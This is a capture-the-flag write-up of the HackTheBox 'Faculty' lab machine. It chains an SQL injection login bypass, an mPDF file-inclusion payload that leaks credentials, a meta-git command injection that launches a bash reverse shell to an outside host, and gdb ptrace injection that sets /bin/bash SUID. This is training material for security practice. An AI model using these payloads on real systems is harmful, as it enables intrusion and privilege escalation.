+++
date = '2025-02-11T14:32:53-05:00'
draft = false
title = 'HtB Faculty'
tags = ['writeup','hackthebox','medium','linux']
hideToc = false
+++
![HtB Faculty](/images/Faculty.png)

Faculty is a medium Linux machine that features a PHP web application that uses a library which is vulnerable to local file inclusion. Exploiting the LFi in this library reveals a password which can be used to log in as a low-level user called `gbyolo` over SSH. The user `gbyolo` has permission to run an `npm` package called `meta-git` as the `developer` user. The version of the `meta-git` installed on this box is vulnerable to code injection, whi ch can be exploited to escalate the privileges to the user `developer`. The privilege escalation to `root` can be performed by exploiting the `CAP_SYS_PTRACE` capability to inject shellcode into a process running as `root`.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/faculty]
└─$ nmap -T4 -p- -A 10.129.227.208
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 10:40 EST
Nmap scan report for 10.129.227.208
Host is up (0.028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### nginx 1.18.0 - 80/tcp

```sh
┌──(pl4stic㉿kali)-[~/htb/faculty]
└─$ gobuster dir -u http://faculty.htb/ -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://faculty.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 178] [--> http://faculty.htb/admin/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

![faculty1](/images/faculty1.png)

![faculty2](/images/faculty2.png)

## Initial Access

### SQL Injection

Let's try a simple login bypass on the primary faculty login page: `' or 1=1;-- -`

![faculty3](/images/faculty3.png)

Not a whole lot we can do here. Let's try the same injection on the admin login page: `' or 1=1;-- -` for the user, and anything goes for the password.

![faculty4](/images/faculty4.png)

![faculty5](/images/faculty5.png)

I notice that on all of the menu tabs on the left, there is a button to export the data to a `.pdf` file.

![faculty6](/images/faculty6.png)

And when viewing that `.pdf`, especially the URL its stored in, it would appear the website is using the `mpdf` library for generation.

![faculty7](/images/faculty7.png)

![faculty8](/images/faculty8.png)

### MPDF Vulnerability

After a little research, it appears MPDF 6.0 might be vulnerable to a Local File Inclusion vulnerability detailed in this [GitHub issue](https://github.com/mpdf/mpdf/issues/356).  It would appear the following code can include local files into the generated PDF:

```html
<annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

Examining the POST request to MPDF that generates the PDF file, it appears the data is base64 encoded, and then double URL encoded.

![faculty9](/images/faculty9.png)

```html
<h1><a name="top"></a>faculty.htb</h1><h2>Courses</h2><table>	<thead>		<tr>			<th class="text-center">#</th>			<th class="text-center">Course</th>			<th class="text-center">Description</th>			</tr></thead><tbody><tr><td class="text-center">1</td><td class="text-center"><b>Information Technology</b></td><td class="text-center"><small><b>IT</b></small></td></tr><tr><td class="text-center">2</td><td class="text-center"><b>BSCS</b></td><td class="text-center"><small><b>Bachelor of Science in Computer Science</b></small></td></tr><tr><td class="text-center">3</td><td class="text-center"><b>BSIS</b></td><td class="text-center"><small><b>Bachelor of Science in Information Systems</b></small></td></tr><tr><td class="text-center">4</td><td class="text-center"><b>BSED</b></td><td class="text-center"><small><b>Bachelor in Secondary Education</b></small></td></tr></tboby></table>
```

Let's take our payload from the GitHub issue, double URL encode it, then base64 encode it, and send it to MPDF to see what happens. It appears we successfully grabbed `/etc/passwd` and it was attached to the PDF file.

![faculty10](/images/faculty10.png)

```sh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

#### File Enumeration

`ajax.php` seemed pretty important, as it handled all the login and navigation requests from the web application. Let's look at that.

```php
<?php
ob_start();
$action = $_GET['action'];
include 'admin_class.php';
$crud = new Action();
if($action == 'login'){
        $login = $crud->login();
        if($login)
                echo $login;
}
[--snip--]
```

Not much in there, but I bet `admin_class.php` might have some interesting info. Let's take a look.

```php
<?php
session_start();
ini_set('display_errors', 1);
Class Action {
        private $db;

        public function __construct() {
                ob_start();
        include 'db_connect.php';
[--snip--]
```

Now we're starting to see files that we know usually contain usernames and passwords. Third time's a charm, let's check out `db_connect.php`.

```php
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

Credentials! `sched:Co.met06aci.dly53ro.per`

### Pass the Password

```sh
┌──(pl4stic㉿kali)-[~/htb/faculty]
└─$ netexec ssh faculty.htb -u users.txt -p 'Co.met06aci.dly53ro.per' --continue-on-success
SSH   10.129.227.208  22  faculty.htb  [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
SSH   10.129.227.208  22  faculty.htb  [-] root:Co.met06aci.dly53ro.per
SSH   10.129.227.208  22  faculty.htb  [-] developer:Co.met06aci.dly53ro.per
SSH   10.129.227.208  22  faculty.htb  [+] gbyolo:Co.met06aci.dly53ro.per  Linux - Shell access!
```

## Shell as gbyolo

### mail

Upon logging in via SSH, I immediately see the user `gbyolo` has mail. Let's check it.

```sh
gbyolo@faculty:~$ mail
"/var/mail/gbyolo": 1 message 1 unread
>U   1 developer@faculty. Tue Nov 10 15:03  16/623   Faculty group
? 1
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
        id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20201110140302.0399E26125A@faculty.htb>
Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
```

### sudo -l

```sh
gbyolo@faculty:~$ sudo -l
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

### meta-git

A quick search for `meta-git exploit` brings me to this article from [Hacker One](https://hackerone.com/reports/728040). It appears we can achieve ~~remote~~ code execution. Let's test it out.

```sh
gbyolo@faculty:/tmp$ sudo -u developer meta-git clone 'sss||touch HACKED'
meta git cloning into 'sss||touch HACKED' at sss||touch HACKED

sss||touch HACKED:
fatal: repository 'sss' does not exist
sss||touch HACKED ✓
(node:7954) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/tmp/sss||touch HACKED'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:7954) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)
(node:7954) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
```

```sh
gbyolo@faculty:/tmp$ ls -al
total 48
drwxrwxrwt 12 root      root      4096 Feb 11 19:24 .
drwxr-xr-x 19 root      root      4096 Jun 23  2022 ..
drwxrwxrwt  2 root      root      4096 Feb 11 16:39 .ICE-unix
drwxrwxrwt  2 root      root      4096 Feb 11 16:39 .Test-unix
drwxrwxrwt  2 root      root      4096 Feb 11 16:39 .X11-unix
drwxrwxrwt  2 root      root      4096 Feb 11 16:39 .XIM-unix
drwxrwxrwt  2 root      root      4096 Feb 11 16:39 .font-unix
-rw-rw-r--  1 developer developer    0 Feb 11 19:24 HACKED
-rw-rw-r--  1 developer developer    0 Feb 11 19:24 sss
[--snip--]
```

Let's rework the command to hopefully get a shell as `developer`. I'll create a `.sh` file as follows, and then execute with the exploit:

```sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.42/4444 0>&1
```

```sh
gbyolo@faculty:/tmp$ sudo -u developer meta-git clone 'sss||bash /tmp/shell.sh'
```

```sh
┌──(pl4stic㉿kali)-[~/htb/faculty]
└─$ nc -nvlp 4444                 
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.227.208] 33344
developer@faculty:/tmp$
```

## Shell as developer

### Enumeration

```sh
developer@faculty:/tmp$ id
id
uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)

developer@faculty:/tmp$ find / -group debug 2>/dev/null
find / -group debug 2>/dev/null
/usr/bin/gdb
```

Looks like only members of the `debug` group can execute `gdb` on this system. Let's dig into the binary and see if it has any special permissions or capabilities.

```sh
developer@faculty:/tmp$ getcap /usr/bin/gdb
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace+ep
```

According to [Elastic](https://www.elastic.co/guide/en/security/current/privilege-escalation-via-gdb-cap-sys-ptrace.html), `gdb` with the `cap_sys_ptrace` capability can:

>Identifies instances where GDB (granted the CAP_SYS_PTRACE capability) is executed, after which the user’s access is elevated to UID/GID 0 (root). In Linux, the CAP_SYS_PTRACE capability grants a process the ability to use the ptrace system call, which is typically used for debugging and allows the process to trace and control other processes. Attackers may leverage this capability to hook and inject into a process that is running with root permissions in order to escalate their privileges to root.

### GDB + cap_sys_ptrace

After looking at the Elastic article, and some other articles found through Google, we should be able to find a process that has access to system commands. Once we attach, we should be able to call any system commands we'd like, and set the SUID permissions of `/bin/bash` to obtain a root shell.

#### Find a Process

Found a process running as `root` we can use using `ps auxww | grep root`:

`root         684  0.0  0.9  26896 18152 ?        Ss   16:39   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers`

#### Exploit

First, attach gdb to the process:

```sh
developer@faculty:/tmp$ gdb -q -p 684
Attaching to process 684
Reading symbols from /usr/bin/python3.8...
(No debugging symbols found in /usr/bin/python3.8)
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
Reading symbols from /usr/lib/debug/.build-id/18/78e6b475720c7c51969e69ab2d276fae6d1dee.debug...
Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0...
Reading symbols from /usr/lib/debug/.build-id/7b/4536f41cdaa5888408e82d0836e33dcf436466.debug...
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2...
Reading symbols from /usr/lib/debug/.build-id/c0/f40155b3f8bf8c494fa800f9ab197ebe20ed6e.debug...
Reading symbols from /lib/x86_64-linux-gnu/libutil.so.1...
Reading symbols from /usr/lib/debug/.build-id/4f/3ee75c38f09d6346de1e8eca0f8d8a41071d9f.debug...
Reading symbols from /lib/x86_64-linux-gnu/libm.so.6...
Reading symbols from /usr/lib/debug/.build-id/fe/91b4090ea04c1559ff71dd9290062776618891.debug...
Reading symbols from /lib/x86_64-linux-gnu/libexpat.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libexpat.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libz.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libz.so.1)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
Reading symbols from /lib/x86_64-linux-gnu/libnss_files.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/da81f0ac3660e3c3cb947c6244151d879ed9e8.debug...
Reading symbols from /usr/lib/python3.8/lib-dynload/_json.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_json.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /usr/lib/python3/dist-packages/gi/_gi.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/gi/_gi.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libglib-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libglib-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgobject-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgobject-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgirepository-1.0.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgirepository-1.0.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libffi.so.7...
(No debugging symbols found in /lib/x86_64-linux-gnu/libffi.so.7)
Reading symbols from /lib/x86_64-linux-gnu/libpcre.so.3...
(No debugging symbols found in /lib/x86_64-linux-gnu/libpcre.so.3)
Reading symbols from /lib/x86_64-linux-gnu/libgmodule-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgmodule-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgio-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgio-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libmount.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libmount.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libselinux.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libselinux.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libresolv.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/19041bde5b859c55798ac0745b0b6199cb7d94.debug...
Reading symbols from /lib/x86_64-linux-gnu/libblkid.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libblkid.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libpcre2-8.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libpcre2-8.so.0)
Reading symbols from /usr/lib/python3/dist-packages/_dbus_bindings.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/_dbus_bindings.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libdbus-1.so.3...
(No debugging symbols found in /lib/x86_64-linux-gnu/libdbus-1.so.3)
Reading symbols from /lib/x86_64-linux-gnu/libsystemd.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libsystemd.so.0)
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
Reading symbols from /usr/lib/debug/.build-id/ce/016c975d94bc4770ed8c62d45dea6b71405a2c.debug...
Reading symbols from /lib/x86_64-linux-gnu/liblzma.so.5...
(No debugging symbols found in /lib/x86_64-linux-gnu/liblzma.so.5)
Reading symbols from /lib/x86_64-linux-gnu/liblz4.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/liblz4.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libgcrypt.so.20...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgcrypt.so.20)
Reading symbols from /lib/x86_64-linux-gnu/libgpg-error.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgpg-error.so.0)
Reading symbols from /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libbz2.so.1.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libbz2.so.1.0)
Reading symbols from /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so)
0x00007f5c80ab0967 in __GI___poll (fds=0x2626a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29
29      ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
```

Verify and make system calls to set SUID permissions of `/bin/bash`:

```sh
(gdb) p system
$1 = {int (const char *)} 0x7f5c809f0290 <__libc_system>
(gdb) call system("chmod 4755 /bin/bash")
[Detaching after vfork from child process 9630]
$2 = 0
(gdb) quit
A debugging session is active.

        Inferior 1 [process 684] will be detached.

Quit anyway? (y or n) y
Detaching from program: /usr/bin/python3.8, process 684
[Inferior 1 (process 684) detached]
```

Get your root shell:

```sh
developer@faculty:/tmp$ bash -p
bash-5.0# id
uid=1001(developer) gid=1002(developer) euid=0(root) groups=1002(developer),1001(debug),1003(faculty)
```
